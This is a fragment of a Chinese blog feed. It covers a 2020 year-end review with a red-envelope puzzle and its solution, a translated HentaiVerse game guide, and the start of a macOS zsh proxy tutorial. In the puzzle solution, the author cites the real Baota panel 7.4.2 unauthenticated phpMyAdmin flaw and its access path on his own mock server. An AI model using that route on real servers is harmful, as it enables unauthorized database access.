href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 